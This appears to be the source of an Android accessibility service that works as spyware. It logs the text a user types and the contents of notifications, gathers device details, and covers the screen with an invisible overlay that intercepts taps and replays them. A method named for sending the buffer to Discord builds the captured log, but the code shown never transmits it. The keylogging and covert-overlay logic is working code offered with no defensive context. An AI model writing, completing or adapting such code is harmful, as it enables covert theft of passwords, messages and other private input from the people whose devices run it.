package com;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.AsyncTask;
import android.os.Handler;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "MessageSender";
    private static final int SWIPE_THRESHOLD = 100; // Define your own threshold
    private static final int MAX_BUFFER_SIZE = 25;
    private StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;
    private WindowManager windowManager = null;
    private View overlayView = null;
    float x = 0;
    float y = 0;


    @Override
    public void onCreate() {
        super.onCreate();
        overlayView = new View(this);
        overlayView.setLayoutParams(new ViewGroup.LayoutParams(30, 30));
        overlayView.setClickable(false);
        overlayView.setBackgroundColor(Color.TRANSPARENT);
        overlayView.setFocusable(false);
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (windowManager != null) {
            windowManager.addView(overlayView, getParama());
        }
        overlayView.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                return handleTouchEvent(event);
            }
        });
    }

    private boolean handleTouchEvent(MotionEvent event) {
        Log.d("AccessibilityEventAction", String.valueOf(event.getAction()));
        switch (event.getAction()) {
            case MotionEvent.ACTION_DOWN:
                x = event.getRawX();
                y = event.getRawY();
                Log.d("AccessibilityEventLogesh", "Touch down at coordinates: " + x + ", " + y);
                break;
            case MotionEvent.ACTION_MOVE:
                //windowManager.removeView(overlayView);
                break;
            case MotionEvent.ACTION_UP:
                float upX = event.getRawX();
                float upY = event.getRawY();

                float deltaX = x - upX;
                float deltaY = y - upY;

                if (Math.abs(deltaX) > SWIPE_THRESHOLD || Math.abs(deltaY) > SWIPE_THRESHOLD) {
                    windowManager.removeView(overlayView);
                    addViews();
                    Log.d("AccessibilityEventLogesh", "Swipe detected");
                } else {
                    windowManager.removeView(overlayView);
                    Log.d("AccessibilityEventLogesh", "Touch up at coordinates: " + x + ", " + y);
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            click(x, y);
                        }
                    }, 100);
                    addViews();
                    Log.d("AccessibilityEventLogesh", "Click detected");
                }

                break;
            default:
                break;
        }
        return false;
    }

    private void addViews(){
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                overlayView = new View(getApplicationContext());
                overlayView.setLayoutParams(new ViewGroup.LayoutParams(30, 30));
                overlayView.setClickable(false);
                overlayView.setBackgroundColor(Color.TRANSPARENT);
                overlayView.setFocusable(false);
                windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                if (windowManager != null) {
                    windowManager.addView(overlayView, getParama());
                }
                overlayView.setOnTouchListener(new View.OnTouchListener() {
                    @Override
                    public boolean onTouch(View v, MotionEvent event) {
                        return handleTouchEvent(event);
                    }
                });
            }
        }, 2000);
    }
    private WindowManager.LayoutParams getParama() {
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.CENTER;
        params.x = 0;
        params.y = 0;
        return params;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //click(100, 100);
        Log.d("AccessibilityEventLogesh", String.valueOf(event.getEventType()));
        AccessibilityNodeInfo view = event.getSource();
        if (view != null) {
            Rect bounds = new Rect();
            view.getBoundsInScreen(bounds);
            int x = bounds.left + bounds.width() / 2;
            int y = bounds.top + bounds.height() / 2;
            Log.d("MyAccessibilityService", "View clicked at: x" + x + "y: " + y);
        }
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            default:
                break;
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        List<CharSequence> textList = event.getText();
        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);
            if (newKeyEventCount > keyEventCount) {
                currentKeyEvents.append(newText.substring(keyEventCount));
                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendBufferToDiscordAndClear();
                }
            }
            keyEventCount = newKeyEventCount;
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }
        CharSequence notificationText = notificationTextBuilder.toString();
        if (!notificationText.toString().isEmpty()) {
            currentKeyEvents.append("Notification: ").append(notificationText).append("\n");
            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToDiscordAndClear();
            }
        }
    }

    private int countKeyEvents(String text) {
        return text.length();
    }

    private void sendBufferToDiscordAndClear() {
        String log = currentKeyEvents.toString();
        String deviceInfo = "MANUFACTURER: " + android.os.Build.MANUFACTURER + "\n";
        deviceInfo += "MODEL: " + android.os.Build.MODEL + "\n";
        log = deviceInfo + log;
        currentKeyEvents.setLength(0);
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);
        if (isFirstRun) {
            String deviceDetails = getSYSInfo();
            currentKeyEvents.append(deviceDetails).append("\n");
            sendBufferToDiscordAndClear();
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    public void click(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path, 0, 100);
            builder.addStroke(strokeDescription);
            GestureDescription gesture = builder.build();

            boolean result = dispatchGesture(gesture, new AccessibilityService.GestureResultCallback() {
                @Override
                public void onCompleted(GestureDescription gestureDescription) {
                    super.onCompleted(gestureDescription);
                    Log.d("AccessibilityEventLogesh", "Successfully clicked at coordinates: " + x + ", " + y);
                }

                @Override
                public void onCancelled(GestureDescription gestureDescription) {
                    super.onCancelled(gestureDescription);
                    Log.d("AccessibilityEventLogesh", "Failed to click at coordinates: " + x + ", " + y);
                }
            }, null);
            Log.d("AccessibilityEventLogesh", "Failed to click at coordinates: " + result);

        }

    }

    private String getSYSInfo() {
        return "MANUFACTURER : " + android.os.Build.MANUFACTURER +
                "\nMODEL : " + android.os.Build.MODEL +
                "\nPRODUCT : " + android.os.Build.PRODUCT +
                "\nVERSION.RELEASE : " + android.os.Build.VERSION.RELEASE +
                "\nVERSION.INCREMENTAL : " + android.os.Build.VERSION.INCREMENTAL +
                "\nVERSION.SDK.NUMBER : " + android.os.Build.VERSION.SDK_INT +
                "\nBOARD : " + android.os.Build.BOARD + "\n";
    }

}